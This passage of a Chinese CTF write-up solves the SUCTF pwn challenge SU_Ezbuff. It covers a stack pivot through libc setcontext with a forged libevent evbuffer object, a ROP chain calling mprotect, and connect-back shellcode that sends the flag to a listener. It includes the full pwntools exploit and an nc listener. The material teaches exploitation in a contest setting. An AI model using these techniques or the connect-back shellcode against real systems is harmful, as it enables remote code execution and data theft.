0x555555555533 None</span><br><span class="line">   3   0x555555555619 None</span><br><span class="line">   4   0x7ffff7f7a2dc bufferevent_run_readcb_+44</span><br><span class="line">   5   0x7ffff7f7ce3c None</span><br><span class="line">   6   0x7ffff7f84f58 None</span><br><span class="line">   7   0x7ffff7f868a7 event_base_loop+1399</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>
+
+<p>通过栈帧图 , 可以分析到, 很难通过单个的gadget进行栈迁移</p>
+<p>因为这里的寄存器中大多存储着obj的起始地址, 而前几个字段是不能动的(会被<code>evbuffer_add_reference</code>填上堆地址) , 包括rdi</p>
+<p>由于libc版本为2.35, 可以联想到<code>setcontext</code>, 我们逆向以下<code>libc.so.6</code>可以发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000539E0 setcontext      proc near               ; CODE XREF: sub_5A0C0+80↓p</span><br><span class="line">.text:00000000000539E0                                         ; DATA XREF: LOAD:0000000000006AB0↑o</span><br><span class="line">.text:00000000000539E0 ; __unwind &#123;</span><br><span class="line">.text:00000000000539E0                 endbr64</span><br><span class="line">.text:00000000000539E4                 push    rdi</span><br><span class="line">.text:00000000000539E5                 lea     rsi, [rdi+128h] ; nset</span><br><span class="line">.text:00000000000539EC                 xor     edx, edx        ; oset</span><br><span class="line">.text:00000000000539EE                 mov     edi, 2          ; how</span><br><span class="line">.text:00000000000539F3                 mov     r10d, 8         ; sigsetsize</span><br><span class="line">.text:00000000000539F9                 mov     eax, 0Eh</span><br><span class="line">.text:00000000000539FE                 syscall                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000053A00                 pop     rdx</span><br><span class="line">.text:0000000000053A01                 cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000053A07                 jnb     loc_53B2F</span><br><span class="line">.text:0000000000053A0D                 mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000053A14                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000053A16                 ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:0000000000053A1D                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000053A24                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000053A2B                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000053A2F                 mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000053A33                 mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000053A37                 mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000053A3B                 mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000053A3F                 test    dword ptr fs:48h, 2</span><br><span class="line">.text:0000000000053A4B                 jz      loc_53B06</span><br><span class="line">.text:0000000000053A51                 mov     rsi, [rdx+3A8h]</span><br><span class="line">.text:0000000000053A58                 mov     rdi, rsi</span><br><span class="line">.text:0000000000053A5B                 mov     rcx, [rdx+3B0h]</span><br><span class="line">.text:0000000000053A62                 cmp     rcx, fs:78h</span><br></pre></td></tr></table></figure>
+
+<p>这里是通过rdi设置寄存器(包括rsp)的, 且偏移较大, 几乎在obj的末尾或者obj的高地址处</p>
+<p>于是我们就可以开始构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000053A14                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000053A16                 ldmxcsr dword ptr [rdx+1C0h]</span><br></pre></td></tr></table></figure>
+
+<p>绕过这两个汇编片段需要rcx为一个可读可写的地址, 且里面的值最好为0</p>
+<p>最终可以将rsp迁到bss上, 但唯一美中不足的是存在一个<code>push rcx;...ret</code>的过程, 而<code>rcx</code>对应的位置恰好和<code>flags</code>字段重合</p>
+<p>而<code>flags</code>字段必须满足末尾为<code>1</code></p>
+<p>解决方法就是找到一个末尾为<code>1</code>的<code>ret</code>地址写入<code>flags</code>字段 , 我选择的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000013A3                 retn</span><br></pre></td></tr></table></figure>
+
+<p>此时我们就可以在obj的高地址处布置ROP链, 不想计算精确的偏移可以垫几个ret划过去</p>
+<h2 id="ROP2shellcode"><a href="#ROP2shellcode" class="headerlink" title="ROP2shellcode"></a>ROP2shellcode</h2><p>ROP的构造很轻松, 找到控制寄存器的gadget后调用一次mprotect将bss段变为rwx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi=base+0x000000000000d879</span><br><span class="line">rsi=base+0x000000000000d2e5</span><br><span class="line">rdx=base+0x00000000000339dd#pop rdx ; pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">mprotect=Libc+libc.sym.mprotect</span><br><span class="line">rop=p64(rdi)+p64(fake_output&amp;~0xfff)+p64(rsi)+p64(0x5000)+p64(rdx)+p64(7)*4+p64(mprotect)</span><br></pre></td></tr></table></figure>
+
+<p>然后在rop末尾加上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p64(Libc+0x2b78e) : call rsp</span><br></pre></td></tr></table></figure>
+
+<p>接着在rop末尾写shellcode就可以了</p>
+<p>因为这道题使用了socket连接, 我们必须使用内网穿透(本地我就不演示了)获得一个公网IP, 然后<code>open+socket+connect+sendfile</code>将flag发送过去, 具体的原理见   <a target="_blank" rel="noopener" href="https://khighl.github.io/2025/05/15/MiniLCTF%202023/">ezshellcode部分</a></p>
+<p>这里给出板子和效果图</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">sc  = asm(&quot;jmp $+0x100&quot;) + b&#x27;\x00&#x27;*0xf0 + b&#x27;\x90&#x27;*0x10(这里的长跳跃是因为会和obj的一些字段搅在一起报错,最好跳出obj)</span><br><span class="line">sc += asm(r&#x27;&#x27;&#x27;</span><br><span class="line">    xor esi, esi</span><br><span class="line">    mul rsi</span><br><span class="line">    inc esi</span><br><span class="line">    mov edi, esi</span><br><span class="line">    inc edi</span><br><span class="line">    mov al, 41</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov edi, eax</span><br><span class="line">    xor eax, eax</span><br><span class="line">    push rax</span><br><span class="line">    mov rbx, 0x8089A8C05C110002</span><br><span class="line">    push rbx</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov edx, 16</span><br><span class="line">    mov al, 42</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    xor esi, esi</span><br><span class="line">    mov al, 33</span><br><span class="line">    syscall</span><br><span class="line">    inc esi</span><br><span class="line">    mov al, 33</span><br><span class="line">    syscall</span><br><span class="line">    inc esi</span><br><span class="line">    mov al, 33</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    xor eax, eax</span><br><span class="line">    push rax</span><br><span class="line">    mov rbx, 0x67616c662f</span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor esi, esi</span><br><span class="line">    xor edx, edx</span><br><span class="line">    mov eax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    test rax, rax</span><br><span class="line">    js over</span><br><span class="line"></span><br><span class="line">    mov edi, eax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov edx, 0x100</span><br><span class="line">    xor eax, eax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov edx, eax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov edi, 1</span><br><span class="line">    mov eax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">over:</span><br><span class="line">    xor edi, edi</span><br><span class="line">    mov eax, 60</span><br><span class="line">    syscall</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode=sc</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zer00ne@zer00ne-VMware-Virtual-Platform:~/desktop/SUCTF/work/evbuff$ nc -lnvp 4444</span><br><span class="line">Listening on 0.0.0.0 4444</span><br><span class="line">Connection received on 192.168.137.128 34180</span><br><span class="line">flag&#123;evbuff&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import socket</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;info&quot;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">HOST = &quot;127.0.0.1&quot;</span><br><span class="line">TCP_PORT = 8888</span><br><span class="line">UDP_PORT = 8889</span><br><span class="line"></span><br><span class="line">def build_payload(ip_text: str, tail: bytes = b&quot;&quot;) -&gt; bytes:</span><br><span class="line">    return ip_text.encode() + b&quot;\x00&quot; + tail</span><br><span class="line"></span><br><span class="line">def recv_exact(io, n=0x50, timeout=1.0):</span><br><span class="line">    data = b&quot;&quot;</span><br><span class="line">    while len(data) &lt; n:</span><br><span class="line">        chunk = io.recv(n - len(data), timeout=timeout)</span><br><span class="line">        if not chunk:</span><br><span class="line">            break</span><br><span class="line">        data += chunk</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def parse_reply(pkt: bytes):</span><br><span class="line">    if len(pkt) &lt; 0x50:</span><br><span class="line">        return &#123;&quot;ok&quot;: False, &quot;len&quot;: len(pkt), &quot;raw&quot;: pkt&#125;</span><br><span class="line">    family = u16(pkt[0:2])</span><br><span class="line">    ip_raw = pkt[4:8]</span><br><span class="line">    ip_text = socket.inet_ntoa(ip_raw)</span><br><span class="line">    hostname = pkt[0x10:0x50].split(b&quot;\x00&quot;, 1)[0].decode(errors=&quot;ignore&quot;)</span><br><span class="line">    return &#123;</span><br><span class="line">        &quot;ok&quot;: True,</span><br><span class="line">        &quot;family&quot;: family,</span><br><span class="line">        &quot;ip&quot;: ip_text,</span><br><span class="line">        &quot;hostname&quot;: hostname,</span><br><span class="line">        &quot;raw&quot;: pkt,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">def tcp_query(payload: bytes, host=HOST, port=TCP_PORT, timeout=1.0):</span><br><span class="line">    io = remote(host, port)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    pkt = recv_exact(io, 0x50, timeout)</span><br><span class="line">    return io, pkt  </span><br><span class="line"></span><br><span class="line">def udp_query(payload: bytes, host=HOST, port=UDP_PORT, timeout=1.0):</span><br><span class="line">    u = remote(host, port, typ=&quot;udp&quot;)</span><br><span class="line">    u.send(payload)</span><br><span class="line">    pkt = u.recv(timeout=timeout) </span><br><span class="line">    u.close()</span><br><span class="line">    return pkt</span><br><span class="line">io, pkt = tcp_query(build_payload(&quot;1.1.1.1&quot;))</span><br><span class="line">base=u64(pkt[-8:])-0x13b1a</span><br><span class="line">Libc=base-0x365000</span><br><span class="line">print(&quot;[tcp]&quot;, parse_reply(pkt))</span><br><span class="line">print(&quot;\n\n\n\n&quot;)</span><br><span class="line">print(hex(base+0x13b1a))</span><br><span class="line">#pause()</span><br><span class="line">pkt = udp_query(build_payload(&quot;8.8.8.8&quot;))</span><br><span class="line">print(&quot;[udp]&quot;, parse_reply(pkt))</span><br><span class="line">pie=u64(pkt[-8:])-0x82e8-0xd331+0x14000</span><br><span class="line">print(hex(pie))</span><br><span class="line">#pause()</span><br><span class="line">fake_output=pie+0x40c8</span><br><span class="line">fake_cb=fake_output+0x88</span><br><span class="line">target=Libc+0x539e0</span><br><span class="line">cb_arg=pie+0x40c8+0xf0+0x50</span><br><span class="line">rdi=base+0x000000000000d879</span><br><span class="line">rsi=base+0x000000000000d2e5</span><br><span class="line">rdx=base+0x00000000000339dd#pop rdx ; pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">mprotect=Libc+libc.sym.mprotect</span><br><span class="line">sc  = asm(&quot;jmp $+0x100&quot;) + b&#x27;\x00&#x27;*0xf0 + b&#x27;\x90&#x27;*0x10</span><br><span class="line">sc += asm(r&#x27;&#x27;&#x27;</span><br><span class="line">    xor esi, esi</span><br><span class="line">    mul rsi</span><br><span class="line">    inc esi</span><br><span class="line">    mov edi, esi</span><br><span class="line">    inc edi</span><br><span class="line">    mov al, 41</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov edi, eax</span><br><span class="line">    xor eax, eax</span><br><span class="line">    push rax</span><br><span class="line">    mov rbx, 0x8089A8C05C110002</span><br><span class="line">    push rbx</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov edx, 16</span><br><span class="line">    mov al, 42</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    xor esi, esi</span><br><span class="line">    mov al, 33</span><br><span class="line">    syscall</span><br><span class="line">    inc esi</span><br><span class="line">    mov al, 33</span><br><span class="line">    syscall</span><br><span class="line">    inc esi</span><br><span class="line">    mov al, 33</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    xor eax, eax</span><br><span class="line">    push rax</span><br><span class="line">    mov rbx, 0x67616c662f</span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor esi, esi</span><br><span class="line">    xor edx, edx</span><br><span class="line">    mov eax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    test rax, rax</span><br><span class="line">    js over</span><br><span class="line"></span><br><span class="line">    mov edi, eax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov edx, 0x100</span><br><span class="line">    xor eax, eax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov edx, eax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov edi, 1</span><br><span class="line">    mov eax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">over:</span><br><span class="line">    xor edi, edi</span><br><span class="line">    mov eax, 60</span><br><span class="line">    syscall</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode=sc</span><br><span class="line">rop=p64(rdi)+p64(fake_output&amp;~0xfff)+p64(rsi)+p64(0x5000)+p64(rdx)+p64(7)*4+p64(mprotect)</span><br><span class="line">obj = flat(&#123;</span><br><span class="line">    # fake evbuffer</span><br><span class="line">    0x00: p64(0),                   # first = NULL</span><br><span class="line">    0x08: p64(0),                   # last = NULL</span><br><span class="line">    0x10: p64(fake_output),         # last_with_datap = self</span><br><span class="line">    0x18: p64(0),                   # total_len</span><br><span class="line">    0x20: p64(0),                   # n_add_for_cb</span><br><span class="line">    0x28: p64(0),                   # n_del_for_cb</span><br><span class="line">    0x30: p64(0),                   # lock = NULL</span><br><span class="line">    0x38: p64(0),                   # flags + padding，别开 deferred</span><br><span class="line">    0x40: p64(0),                   # deferred_cb_queue = NULL</span><br><span class="line">    0x48: p32(1) + p32(0),          # refcnt = 1</span><br><span class="line">    0x50: b&#x27;\x00&#x27; * 0x28,           # fake_deferred_cb，先全 0</span><br><span class="line">    0x78: p64(fake_cb),             # callbacks = &amp;fake_cb</span><br><span class="line">    0x80: p64(0),                   # parent = NULL</span><br><span class="line"></span><br><span class="line">    # fake evbuffer_cb_entry</span><br><span class="line">    0x88: p64(0),                   # next = NULL</span><br><span class="line">    0x90: p64(fake_output + 0x78),  # prev_nextp</span><br><span class="line">    0x98: p64(target),              # cb_func</span><br><span class="line">    0xA0: p64(cb_arg),              # cbarg</span><br><span class="line">    0xA8: p64(pie+0x13A3),    # flags</span><br><span class="line">    0xE0: p64(pie+0x40c8+0x500)</span><br><span class="line">&#125;, filler=b&#x27;\x00&#x27;)</span><br><span class="line">obj+=p64(pie+0x13A3)*0x10</span><br><span class="line">obj+=rop+p64(Libc+0x2b78e)</span><br><span class="line">obj+=shellcode</span><br><span class="line">payload=p64(pie+0x40c8)+obj   #0x5555555580c0  === offset + 0x40c0</span><br><span class="line">payload=p64(pie+0x4040+0x80)+p64(1)*3+p64(pie+0x4040+0x80-0x118)+p64(0)*3+payload</span><br><span class="line">pause()</span><br><span class="line">io, pkt = tcp_query(build_payload(&quot;1.1.1.1&quot;,payload))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 4444</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/mls.png" data-sizes="auto" alt="minivfs" class="lazyload">
+      
+      <a href="/2026/03/18/SU_Minivfs/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          minivfs
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        71.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:34
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SU-Ezbuff"><span class="toc-number">1.</span> <span class="toc-text">SU_Ezbuff</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-obj%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.2.</span> <span class="toc-text">fake_obj构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">pwn分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#libevent-2-1-so-7-0-1-so%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">libevent-2.1.so.7.0.1.so分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-EE50%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">sub_EE50绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">锁绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.3.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP2shellcode"><span class="toc-number">1.4.</span> <span class="toc-text">ROP2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toc-number">1.5.</span> <span class="toc-text">完整EXP</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
